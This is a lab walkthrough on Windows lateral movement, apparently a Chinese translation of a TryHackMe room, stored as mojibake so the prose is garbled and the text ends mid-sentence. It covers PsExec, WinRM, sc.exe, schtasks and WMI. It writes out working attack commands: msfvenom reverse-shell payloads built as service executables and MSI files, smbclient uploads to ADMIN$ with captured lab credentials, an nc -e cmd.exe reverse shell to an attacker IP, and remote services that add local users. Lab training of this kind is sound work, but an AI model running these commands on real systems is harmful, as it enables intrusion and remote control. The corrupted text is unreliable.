ä¸€ç›´æ˜¯éœ€è¦è¿œç¨‹æ‰§è¡Œè¿›ç¨‹æ—¶çš„é¦–é€‰æ–¹æ³•ã€‚å®ƒå…è®¸ç®¡ç†å‘˜ç”¨æˆ·åœ¨ä»–æœ‰æƒè®¿é—®çš„ä»»ä½• PC ä¸Šè¿œç¨‹è¿è¡Œå‘½ä»¤ã€‚ Psexec æ˜¯ä¼—å¤š Sysinternals å·¥å…·ä¹‹ä¸€ï¼Œå¯ä»¥åœ¨æ­¤å¤„ä¸‹è½½ï¼šhere psexec çš„å·¥ä½œæ–¹å¼å¦‚ä¸‹ï¼š è¿æ¥åˆ° Admin$ å…±äº«å¹¶ä¸Šä¼ æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ Psexec ä½¿ç”¨ psexesvc.exe ä½œä¸ºåç§°ã€‚ è¿æ¥åˆ°æœåŠ¡æ§åˆ¶ç®¡ç†å™¨ä»¥åˆ›å»ºå¹¶è¿è¡Œåä¸º PSEXESVC çš„æœåŠ¡ï¼Œå¹¶å°†æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶ä¸ C:\\Windows\\psexesvc.exe å…³è”ã€‚ åˆ›å»ºä¸€äº›å‘½åç®¡é“æ¥å¤„ç† stdin/stdout/stderrã€‚ è¦è¿è¡Œ psexecï¼Œæˆ‘ä»¬åªéœ€æä¾›è¿œç¨‹ä¸»æœºæ‰€éœ€çš„ç®¡ç†å‘˜å‡­æ®ä»¥åŠæˆ‘ä»¬è¦è¿è¡Œçš„å‘½ä»¤ï¼ˆä¸ºæ–¹ä¾¿èµ·è§ï¼Œ psexec64.exe å¯åœ¨ THMJMP2 ä¸­çš„ C:\\tools ä¸‹æ‰¾åˆ°ï¼‰ï¼š psexec64.exe \\\\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe ä½¿ç”¨ WinRM è¿œç¨‹åˆ›å»ºè¿›ç¨‹ Ports: 5985/TCP (WinRM HTTP) æ‰€éœ€çš„ç»„æˆå‘˜èº«ä»½ï¼šè¿œç¨‹ç®¡ç†ç”¨æˆ· Windows è¿œç¨‹ç®¡ç† (WinRM) æ˜¯ä¸€ç§åŸºäº Web çš„åè®®ï¼Œç”¨äºè¿œç¨‹å‘ Windows ä¸»æœºå‘é€ Powershell å‘½ä»¤ã€‚å¤§å¤šæ•° Windows Server å®‰è£…éƒ½ä¼šé»˜è®¤å¯ç”¨ WinRMï¼Œè¿™ä½¿å…¶æˆä¸ºä¸€ä¸ªæœ‰å¸å¼•åŠ›çš„æ”»å‡»åª’ä»‹ã€‚ è¦ä»å‘½ä»¤è¡Œè¿æ¥åˆ°è¿œç¨‹ Powershell ä¼šè¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š winrs.exe -u:Administrator -p:Mypass123 -r:target cmd æˆ‘ä»¬å¯ä»¥ä» Powershell å®ç°ç›¸åŒçš„ç›®çš„ï¼Œä½†è¦ä¼ é€’ä¸åŒçš„å‡­æ®ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª PSCredential å¯¹è±¡ï¼š $username = 'Administrator'; $password = 'Mypass123'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; è·å¾— PSCredential å¯¹è±¡åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Enter-PSSession cmdlet åˆ›å»ºäº¤äº’å¼ä¼šè¯ï¼š Enter-PSSession -Computername TARGET -Credential $credential Powershell è¿˜åŒ…æ‹¬ Invoke-Command cmdletï¼Œå®ƒé€šè¿‡ WinRM è¿œç¨‹è¿è¡Œ ScriptBlocksã€‚å‡­è¯ä¹Ÿå¿…é¡»é€šè¿‡ PSCredential å¯¹è±¡ä¼ é€’ï¼š Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami} ä½¿ç”¨ sc è¿œç¨‹åˆ›å»ºæœåŠ¡ Ports: ç«¯å£ï¼š 135/TCPã€49152-65535/TCPï¼ˆDCE/RPCï¼‰ 445/TCPï¼ˆåŸºäº SMB å‘½åç®¡é“çš„ RPCï¼‰ 139/TCPï¼ˆåŸºäº SMB å‘½åç®¡é“çš„ RPCï¼‰ æ‰€éœ€çš„ç»„æˆå‘˜èº«ä»½ï¼šç®¡ç†å‘˜ Windows æœåŠ¡ä¹Ÿå¯ç”¨äºè¿è¡Œä»»æ„å‘½ä»¤ï¼Œå› ä¸ºå®ƒä»¬åœ¨å¯åŠ¨æ—¶æ‰§è¡Œå‘½ä»¤ã€‚è™½ç„¶æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶åœ¨æŠ€æœ¯ä¸Šä¸å¸¸è§„åº”ç”¨ç¨‹åºä¸åŒï¼Œä½†å¦‚æœæˆ‘ä»¬é…ç½® Windows æœåŠ¡æ¥è¿è¡Œä»»ä½•åº”ç”¨ç¨‹åºï¼Œå®ƒä»ç„¶ä¼šæ‰§è¡Œè¯¥åº”ç”¨ç¨‹åºå¹¶éšåå¤±è´¥ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ sc.exeï¼ˆWindows ä¸­æä¾›çš„æ ‡å‡†å·¥å…·ï¼‰åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºæœåŠ¡ã€‚ä½¿ç”¨scæ—¶ï¼Œå®ƒä¼šé€šè¿‡å‡ ç§æ–¹å¼å°è¯•é€šè¿‡RPCè¿æ¥åˆ°Service Control Managerï¼ˆSVCCTLï¼‰è¿œç¨‹æœåŠ¡ç¨‹åºï¼š å°†ä½¿ç”¨ DCE/RPC è¿›è¡Œè¿æ¥å°è¯•ã€‚å®¢æˆ·ç«¯å°†é¦–å…ˆåœ¨ç«¯å£ 135 è¿æ¥åˆ°ç«¯ç‚¹æ˜ å°„å™¨ (EPM)ï¼Œè¯¥ç«¯ç‚¹æ˜ å°„å™¨å……å½“å¯ç”¨ RPC ç«¯ç‚¹çš„ç›®å½•å¹¶è¯·æ±‚æœ‰å…³ SVCCTL æœåŠ¡ç¨‹åºçš„ä¿¡æ¯ã€‚ç„¶åï¼ŒEPM å°†å“åº” IP å’Œç«¯å£ä»¥è¿æ¥åˆ° SVCCTLï¼Œè¯¥ç«¯å£é€šå¸¸æ˜¯ 49152-65535 èŒƒå›´å†…çš„åŠ¨æ€ç«¯å£ã€‚ å¦‚æœåä¸€ä¸ªè¿æ¥å¤±è´¥ï¼Œsc å°†å°è¯•é€šè¿‡ç«¯å£ 445 (SMB) æˆ– 139ï¼ˆåŸºäº NetBIOS çš„ SMBï¼‰ä¸Šçš„ SMB å‘½åç®¡é“åˆ°è¾¾ SVCCTLã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºå¹¶å¯åŠ¨åä¸ºâ€œTHMserviceâ€çš„æœåŠ¡ï¼š sc.exe \\\\TARGET create THMservice binPath= \"net user munra Pass123 /add\" start= auto sc.exe \\\\TARGET start THMservice æœåŠ¡å¯åŠ¨æ—¶å°†æ‰§è¡Œâ€œnet userâ€å‘½ä»¤ï¼Œåœ¨ç³»ç»Ÿä¸Šåˆ›å»ºä¸€ä¸ªæ–°çš„æœ¬åœ°ç”¨æˆ·ã€‚ç”±äºæ“ä½œç³»ç»Ÿè´Ÿè´£å¯åŠ¨æœåŠ¡ï¼Œå› æ­¤æ‚¨å°†æ— æ³•æŸ¥çœ‹å‘½ä»¤è¾“å‡ºã€‚ è¦åœæ­¢å¹¶åˆ é™¤è¯¥æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š sc.exe \\\\TARGET stop THMservice sc.exe \\\\TARGET delete THMservice è¿œç¨‹åˆ›å»ºè®¡åˆ’ä»»åŠ¡ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„å¦ä¸€ä¸ª Windows åŠŸèƒ½æ˜¯è®¡åˆ’ä»»åŠ¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ schtasks è¿œç¨‹åˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡å¯åœ¨ä»»ä½• Windows å®‰è£…ä¸­ä½¿ç”¨ã€‚è¦åˆ›å»ºåä¸º THMtask1 çš„ä»»åŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š schtasks /s TARGET /RU \"SYSTEM\" /create /tn \"THMtask1\" /tr \"&lt;command/payload to execute&gt;\" /sc ONCE /sd 01/01/1970 /st 00:00 schtasks /s TARGET /run /TN \"THMtask1\" æˆ‘ä»¬å°†è®¡åˆ’ç±»å‹ (/sc) è®¾ç½®ä¸º ONCEï¼Œè¿™æ„å‘³ç€è¯¥ä»»åŠ¡ä»…åœ¨æŒ‡å®šçš„æ—¶é—´å’Œæ—¥æœŸè¿è¡Œä¸€æ¬¡ã€‚ç”±äºæˆ‘ä»¬å°†æ‰‹åŠ¨è¿è¡Œä»»åŠ¡ï¼Œå› æ­¤å¼€å§‹æ—¥æœŸ (/sd) å’Œå¼€å§‹æ—¶é—´ (/st) æ— è®ºå¦‚ä½•éƒ½ä¸é‡è¦ã€‚ ç”±äºç³»ç»Ÿå°†è¿è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œå› æ­¤æˆ‘ä»¬å°†æ— æ³•è·å¾—è¯¥å‘½ä»¤çš„è¾“å‡ºï¼Œè¿™ä½¿å¾—è¿™æ˜¯ä¸€ç§ç›²ç›®æ”»å‡»ã€‚ æœ€åï¼Œè¦åˆ é™¤è®¡åˆ’ä»»åŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¹¶è‡ªè¡Œæ¸…ç†ï¼š schtasks /S TARGET /TN \"THMtask1\" /DELETE /F å®è·µç»ƒä¹  å¯¹äºæœ¬ç»ƒä¹ ï¼Œæˆ‘ä»¬å‡è®¾æˆ‘ä»¬å·²ç»æ•è·äº†ä¸€äº›å…·æœ‰ç®¡ç†è®¿é—®æƒé™çš„å‡­æ®ï¼š User: ZA.TRYHACKME.COM\\t1_leonard.summers Password: EZpass4ever æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•ä½¿ç”¨è¿™äº›å‡­æ®é€šè¿‡ sc.exe æ¨ªå‘ç§»åŠ¨åˆ° THMIISã€‚è¯·éšæ„å°è¯•å…¶ä»–æ–¹æ³•ï¼Œå› ä¸ºå®ƒä»¬éƒ½åº”è¯¥é€‚ç”¨äº THMIISã€‚ è™½ç„¶æˆ‘ä»¬å·²ç»å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ sc åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šåˆ›å»ºç”¨æˆ·ï¼ˆé€šè¿‡ä½¿ç”¨ net user ï¼‰ï¼Œä½†æˆ‘ä»¬è¿˜å¯ä»¥ä¸Šä¼ æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»»ä½•äºŒè¿›åˆ¶æ–‡ä»¶å¹¶å°†å…¶ä¸åˆ›å»ºçš„æœåŠ¡å…³è”ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ä½¿ç”¨æ­¤æ–¹æ³•è¿è¡Œåå‘ shellï¼Œæˆ‘ä»¬ä¼šæ³¨æ„åˆ°åå‘ shell åœ¨æ‰§è¡Œåç«‹å³æ–­å¼€è¿æ¥ã€‚åŸå› æ˜¯æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ä¸æ ‡å‡† .exe æ–‡ä»¶ä¸åŒï¼Œå› æ­¤éæœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶å‡ ä¹ä¼šç«‹å³è¢«æœåŠ¡ç®¡ç†å™¨æ€æ­»ã€‚å¯¹æˆ‘ä»¬æ¥è¯´å¹¸è¿çš„æ˜¯ï¼Œmsfvenom æ”¯æŒ exe-service æ ¼å¼ï¼Œå®ƒå°†æˆ‘ä»¬å–œæ¬¢çš„ä»»ä½•æœ‰æ•ˆè´Ÿè½½å°è£…åœ¨åŠŸèƒ½é½å…¨çš„æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œé˜²æ­¢å…¶è¢«æ€æ­»ã€‚ è¦åˆ›å»ºåå‘shellï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š æ³¨æ„ï¼šç”±äºæ‚¨å°†ä¸å…¶ä»–äººå…±äº«å®éªŒå®¤ï¼Œå› æ­¤æ‚¨éœ€è¦ä¸ºæœ‰æ•ˆè´Ÿè½½ä½¿ç”¨ä¸åŒçš„æ–‡ä»¶åï¼Œè€Œä¸æ˜¯â€œmyservice.exeâ€ï¼Œä»¥é¿å…è¦†ç›–å…¶ä»–äººçš„æœ‰æ•ˆè´Ÿè½½ã€‚ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.236 LPORT=5555 -o bcxservice.exe ç„¶åï¼Œæˆ‘ä»¬å°†ç»§ç»­ä½¿ç”¨ t1_leonard.summers å‡­æ®ï¼Œä½¿ç”¨ AttackBox ä¸­çš„ smbclient å°†æœ‰æ•ˆè´Ÿè½½ä¸Šä¼ åˆ° THMIIS çš„ ADMIN$ å…±äº«ï¼š smbclient -c 'put bcxservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever ä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶åï¼Œæˆ‘ä»¬å°†åœ¨æ”»å‡»è€…çš„è®¡ç®—æœºä¸Šè®¾ç½®ä¸€ä¸ªä¾¦å¬å™¨ä»¥æ¥æ”¶æ¥è‡ª msfconsole çš„åå‘ shellï¼š user@AttackBox$ msfconsole msf6 &gt; use exploit/multi/handler msf6 exploit(multi/handler) &gt; set LHOST 10.50.46.236 msf6 exploit(multi/handler) &gt; set LPORT 5555 msf6 exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.50.46.236:5555 æˆ–è€…ï¼Œæ‚¨å¯ä»¥åœ¨ Linux æ§åˆ¶å°ä¸Šè¿è¡Œä»¥ä¸‹å•è¡Œä»£ç æ¥æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼š msfconsole -q -x \"use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.236; set LPORT 5555;exploit\" ç”±äº sc.exe ä¸å…è®¸æˆ‘ä»¬åœ¨å‘½ä»¤ä¸­æŒ‡å®šå‡­æ®ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨ runas ä½¿ç”¨ t1_leonard.summer çš„è®¿é—®ä»¤ç‰Œç”Ÿæˆä¸€ä¸ªæ–° shellã€‚å°½ç®¡å¦‚æ­¤ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡ SSH è®¿é—®è®¡ç®—æœºï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬å°è¯•ç±»ä¼¼ runas /netonly /user:ZA\\t1_leonard.summers cmd.exe çš„å†…å®¹ï¼Œæ–°çš„å‘½ä»¤æç¤ºç¬¦å°†åœ¨ç”¨æˆ·ä¼šè¯ä¸­ç”Ÿæˆï¼Œä½†æˆ‘ä»¬æ— æ³•è®¿é—®å®ƒã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ runas ç”Ÿæˆå¸¦æœ‰ t1_leonard.summers è®¿é—®ä»¤ç‰Œçš„ç¬¬äºŒä¸ªåå‘ shellï¼š runas /netonly /user:ZA.TRYHACKME.COM\\t1_leonard.summers \"c:\\tools c64.exe -e cmd.exe 10.50.46.236 6666\" æ³¨æ„ï¼šè¯·è®°ä½ï¼Œç”±äºæ‚¨å°† runas ä¸ /netonly é€‰é¡¹ä¸€èµ·ä½¿ç”¨ï¼Œå› æ­¤ä¸ä¼šè´¹å¿ƒæ£€æŸ¥æ‰€æä¾›çš„å‡­æ®æ˜¯å¦æœ‰æ•ˆï¼ˆæœ‰å…³æ­¤çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æšä¸¾ AD å®¤ï¼‰ï¼Œå› æ­¤è¯·åŠ¡å¿…æ­£ç¡®è¾“å…¥å¯†ç ã€‚å¦‚æœä¸è¿™æ ·åšï¼Œæ‚¨ç¨åä¼šåœ¨æˆ¿é—´ä¸­çœ‹åˆ°ä¸€äº› ACCESS DENIED é”™è¯¯ã€‚ æˆ‘ä»¬å¯ä»¥åƒå¾€å¸¸ä¸€æ ·åœ¨ AttackBox ä¸­ä½¿ç”¨ nc æ¥æ”¶åå‘ shell è¿æ¥ï¼š nc -lvnp 6666 æœ€åï¼Œç»§ç»­ä½¿ç”¨ sc è¿œç¨‹åˆ›å»ºä¸€ä¸ªæ–°æœåŠ¡ï¼Œå¹¶å°†å…¶ä¸æˆ‘ä»¬ä¸Šä¼ çš„äºŒè¿›åˆ¶æ–‡ä»¶å…³è”èµ·æ¥ï¼š C:\\&gt; sc.exe \\\\thmiis.za.tryhackme.com create THMservice-bcx binPath= \"%windir%\\bcxservice.exe\" start= auto C:\\&gt; sc.exe \\\\thmiis.za.tryhackme.com start THMservice-bcx è¯·åŠ¡å¿…æ›´æ”¹æ‚¨çš„æœåŠ¡åç§°ï¼Œä»¥é¿å…ä¸å…¶ä»–å­¦ç”Ÿå‘ç”Ÿå†²çªã€‚ å¯åŠ¨è¯¥æœåŠ¡åï¼Œæ‚¨åº”è¯¥ä¼šåœ¨ AttackBox ä¸­æ”¶åˆ°ä¸€ä¸ªè¿æ¥ï¼Œæ‚¨å¯ä»¥ä»è¯¥è¿æ¥è®¿é—® t1_leonard.summers æ¡Œé¢ä¸Šçš„ç¬¬ä¸€ä¸ªæ ‡å¿—ã€‚ 0x04 ä½¿ç”¨ WMI æ¨ªå‘ç§»åŠ¨ æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ Windows Management Instrumentation (WMI) ä»¥ä¸åŒçš„æ–¹å¼æ‰§è¡Œä¸Šä¸€ä¸ªä»»åŠ¡ä¸­è®¨è®ºçš„è®¸å¤šæŠ€æœ¯ã€‚ WMI æ˜¯åŸºäº Web çš„ä¼ä¸šç®¡ç† (WBEM) çš„ Windows å®ç°ï¼ŒWBEM æ˜¯è·¨è®¾å¤‡è®¿é—®ç®¡ç†ä¿¡æ¯çš„ä¼ä¸šæ ‡å‡†ã€‚ ç®€å•æ¥è¯´ï¼ŒWMI å…è®¸ç®¡ç†å‘˜æ‰§è¡Œæ ‡å‡†ç®¡ç†ä»»åŠ¡ï¼Œæ”»å‡»è€…å¯ä»¥æ»¥ç”¨è¿™äº›ä»»åŠ¡ä»¥å„ç§æ–¹å¼æ‰§è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œæˆ‘ä»¬å°†å¯¹æ­¤è¿›è¡Œè®¨è®ºã€‚ ä» Powershell è¿æ¥åˆ° WMI åœ¨èƒ½å¤Ÿä½¿ç”¨ Powershell å‘½ä»¤è¿æ¥åˆ° WMI ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æˆ‘ä»¬çš„ç”¨æˆ·å’Œå¯†ç åˆ›å»ºä¸€ä¸ª PSCredential å¯¹è±¡ã€‚è¯¥å¯¹è±¡å°†å­˜å‚¨åœ¨ $credential å˜é‡ä¸­ï¼Œå¹¶åœ¨è¯¥ä»»åŠ¡çš„æ•´ä¸ªæŠ€æœ¯ä¸­ä½¿ç”¨ï¼š $username = 'Administrator'; $password = 'Mypass123'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; ç„¶åï¼Œæˆ‘ä»¬ç»§ç»­ä½¿ç”¨ä»¥ä¸‹åè®®ä¹‹ä¸€å»ºç«‹ WMI ä¼šè¯ï¼š DCOMï¼šRPC over IP å°†ç”¨äºè¿æ¥åˆ° WMIã€‚è¯¥åè®®ä½¿ç”¨ç«¯å£ 135/TCP å’Œç«¯å£ 49152-65535/TCPï¼Œæ­£å¦‚ä½¿ç”¨ sc.exe æ—¶æ‰€è§£é‡Šçš„é‚£æ ·ã€‚ Wsmanï¼šWinRM å°†ç”¨äºè¿æ¥åˆ° WMIã€‚æ­¤åè®®ä½¿ç”¨ç«¯å£ 5985/TCP (WinRM HTTP) æˆ– 5986/TCP (WinRM HTTPS)ã€‚ è¦ä» Powershell å»ºç«‹ WMI ä¼šè¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¹¶å°†ä¼šè¯å­˜å‚¨åœ¨ $Session å˜é‡ä¸­ï¼Œæˆ‘ä»¬å°†åœ¨æ•´ä¸ªæˆ¿é—´ä¸­ä½¿ç”¨ä¸åŒçš„æŠ€æœ¯ï¼š $Opt = New-CimSessionOption -Protocol DCOM $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop New-CimSessionOption cmdlet ç”¨äºé…ç½® WMI ä¼šè¯çš„è¿æ¥é€‰é¡¹ï¼ŒåŒ…æ‹¬è¿æ¥åè®®ã€‚ç„¶åï¼Œé€‰é¡¹å’Œå‡­æ®å°†ä¼ é€’åˆ° New-CimSession cmdlet ä»¥å»ºç«‹é’ˆå¯¹è¿œç¨‹ä¸»æœºçš„ä¼šè¯ã€‚ ä½¿ç”¨ WMI è¿œç¨‹åˆ›å»ºè¿›ç¨‹ Ports: 135/TCP, 49152-65535/TCP (DCERPC) 5985/TCP (WinRM HTTP) æˆ– 5986/TCP (WinRM HTTPS) æ‰€éœ€çš„ç»„æˆå‘˜èº«ä»½ï¼šç®¡ç†å‘˜ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Windows Management Instrumentation (WMI) ä» Powershell è¿œç¨‹ç”Ÿæˆä¸€ä¸ªè¿›ç¨‹ï¼Œå‘ Win32_Process ç±»å‘é€ WMI è¯·æ±‚ï¼Œä»¥åœ¨æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„ä¼šè¯ä¸‹ç”Ÿæˆè¯¥è¿›ç¨‹ï¼š $Command = \"powershell.exe -Command Set-Content -Path C:\\text.txt -Value munrawashere\"; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command } è¯·æ³¨æ„ï¼ŒWMI ä¸å…è®¸æ‚¨æŸ¥çœ‹ä»»ä½•å‘½ä»¤çš„è¾“å‡ºï¼Œä½†ç¡®å®ä¼šé™é»˜åˆ›å»ºæ‰€éœ€çš„è¿›ç¨‹ã€‚ åœ¨æ—§ç³»ç»Ÿä¸Šï¼Œå¯ä»¥åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹ä½¿ç”¨ wmic å®Œæˆç›¸åŒçš„æ“ä½œï¼š wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create \"cmd.exe /c calc.exe\" ä½¿ç”¨ WMI è¿œç¨‹åˆ›å»ºæœåŠ¡ Ports: 135/TCP, 49152-65535/TCP (DCERPC) 5985/TCP (WinRM HTTP) æˆ– 5986/TCP (WinRM HTTPS) æ‰€éœ€çš„ç»„æˆå‘˜èº«ä»½ï¼šç®¡ç†å‘˜ æˆ‘ä»¬å¯ä»¥é€šè¿‡Powershellä½¿ç”¨WMIåˆ›å»ºæœåŠ¡ã€‚è¦åˆ›å»ºåä¸º THMService2 çš„æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{ Name = \"THMService2\"; DisplayName = \"THMService2\"; PathName = \"net user munra2 Pass123 /add\"; # Your payload ServiceType = [byte]::Parse(\"16\"); # Win32OwnProcess : Start service in a new process StartMode = \"Manual\" } ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥è·å–è¯¥æœåŠ¡çš„å¥æŸ„å¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨å®ƒï¼š $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter \"Name LIKE 'THMService2'\" Invoke-CimMethod -InputObject $Service -MethodName StartService æœ€åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœæ­¢å¹¶åˆ é™¤è¯¥æœåŠ¡ï¼š Invoke-CimMethod -InputObject $Service -MethodName StopService Invoke-CimMethod -InputObject $Service -MethodName Delete ä½¿ç”¨ WMI è¿œç¨‹åˆ›å»ºè®¡åˆ’ä»»åŠ¡ Ports: 135/TCP, 49152-65535/TCP (DCERPC) 5985/TCP (WinRM HTTP) æˆ– 5986/TCP (WinRM HTTPS) æ‰€éœ€çš„ç»„æˆå‘˜èº«ä»½ï¼šç®¡ç†å‘˜ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Windows é»˜è®¤å®‰è£…ä¸­æä¾›çš„ä¸€äº› cmdlet åˆ›å»ºå¹¶æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ï¼š # Payload must be split in Command and Args $Command = \"cmd.exe\" $Args = \"/c net user munra22 aSdf1234 /add\" $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args Register-ScheduledTask -CimSession $Session -Action $Action -User \"NT AUTHORITY\\SYSTEM\" -TaskName \"THMtask2\" Start-ScheduledTask -CimSession $Session -TaskName \"THMtask2\" è¦åœ¨ä½¿ç”¨å®Œè®¡åˆ’ä»»åŠ¡åå°†å…¶åˆ é™¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š Unregister-ScheduledTask -CimSession $Session -TaskName \"THMtask2\" WMI é€šè¿‡ WMI å®‰è£… MSI åŒ… Ports: 135/TCP, 49152-65535/TCP (DCERPC) 5985/TCP (WinRM HTTP) æˆ– 5986/TCP (WinRM HTTPS) æ‰€éœ€çš„ç»„æˆå‘˜èº«ä»½ï¼šç®¡ç†å‘˜ MSI æ˜¯ä¸€ç§ç”¨äºå®‰è£…ç¨‹åºçš„æ–‡ä»¶æ ¼å¼ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥å°† MSI åŒ…å¤åˆ¶åˆ°ç›®æ ‡ç³»ç»Ÿï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ WMI å°è¯•ä¸ºæˆ‘ä»¬å®‰è£…å®ƒã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»»ä½•å¯ç”¨çš„æ–¹å¼å¤åˆ¶è¯¥æ–‡ä»¶ã€‚ä¸€æ—¦ MSI æ–‡ä»¶ä½äºç›®æ ‡ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•é€šè¿‡ WMI è°ƒç”¨ Win32_Product ç±»æ¥å®‰è£…å®ƒï¼š Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = \"C:\\Windows\\myinstaller.msi\"; Options = \"\"; AllUsers = $false} æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨é—ç•™ç³»ç»Ÿä¸­ä½¿ç”¨ wmic æ¥å®ç°ç›¸åŒçš„ç›®çš„ï¼š wmic /node:TARGET /user:DOMAIN\\USER product call install PackageLocation=c:\\Windows\\myinstaller.msi å®è·µç»ƒä¹  å¯¹äºæœ¬ç»ƒä¹ ï¼Œæˆ‘ä»¬å‡è®¾æˆ‘ä»¬å·²ç»æ•è·äº†ä¸€äº›å…·æœ‰ç®¡ç†è®¿é—®æƒé™çš„å‡­æ®ï¼š ç”¨æˆ·ï¼šZA.TRYHACKME.COM\\t1_corine.waters Password: Korine.1994 æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•ä½¿ç”¨è¿™äº›å‡­æ®é€šè¿‡ WMI å’Œ MSI åŒ…æ¨ªå‘ç§»åŠ¨åˆ° THM-IISã€‚è¯·éšæ„å°è¯•æ­¤ä»»åŠ¡ä¸­ä»‹ç»çš„å…¶ä»–æ–¹æ³•ã€‚ æˆ‘ä»¬å°†é¦–å…ˆä»æ”»å‡»è€…æœºå™¨ä¸Šä½¿ç”¨ msfvenom åˆ›å»º MSI æœ‰æ•ˆè´Ÿè½½ï¼š æ³¨æ„ï¼šç”±äºæ‚¨å°†ä¸å…¶ä»–äººå…±äº«å®éªŒå®¤ï¼Œå› æ­¤æ‚¨éœ€è¦ä¸ºæœ‰æ•ˆè´Ÿè½½ä½¿ç”¨ä¸åŒçš„æ–‡ä»¶åï¼Œè€Œä¸æ˜¯â€œmyinstaller.msiâ€ï¼Œä»¥é¿å…è¦†ç›–å…¶ä»–äººçš„æœ‰æ•ˆè´Ÿè½½ã€‚ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.46.236 LPORT=5555 -f msi &gt; bcxinstaller.msi ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ SMB æˆ–ä»»ä½•å…¶ä»–å¯ç”¨çš„æ–¹æ³•å¤åˆ¶æœ‰æ•ˆè´Ÿè½½ï¼š smbclient -c 'put bcxinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994 ç”±äºæˆ‘ä»¬å°†æœ‰æ•ˆè´Ÿè½½å¤åˆ¶åˆ° ADMIN$ å…±äº«ï¼Œå› 